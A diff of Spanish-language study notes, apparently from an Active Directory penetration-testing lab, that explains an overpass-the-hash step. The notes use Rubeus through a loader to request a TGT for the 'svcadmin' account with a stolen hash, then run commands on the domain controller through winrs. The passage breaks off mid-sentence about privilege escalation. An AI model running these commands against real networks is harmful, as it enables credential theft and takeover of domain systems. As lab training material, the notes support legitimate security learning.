@@ -486,5 +486,19 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin 
 
 ```ad-important
 El comando anterior esta solicitando un *ticket Granting Ticket(TGT)* a traves del loader para una cuenta en este caso *svcadmin* usando el hash anterirormente descubierto.
-Tambien se creara un nuevo proceso *cmd.*
+Tambien se creara un nuevo proceso *cmd.exe* con credenciales de red aisladas (net-only logon). Teniendo asi este proceso su propio contexto de autenticacion de red.
+
+1. Se dispone de la clave Kerberos AES de *svcadmin*
+2. Se solicita un TGT para esa cuenta al controlador de dominio
+3. Se crea un proceso *cmd.exe* con un contexto de red independiente
+4. El TGT obtenido se carga en ese contexto
+5. Desde ese proceso las conexiones Kerberos de red se haran como *svcadmin*
 ```
+
+Ahora desde el nuevo proceso podemos intentar acceder al *Domain Controller*
+```shell
+[studen97-newProccess]
+winrs -r:dcorp-dc cmd /c set username
+```
+
+Ahora deberemos de elevar los privile
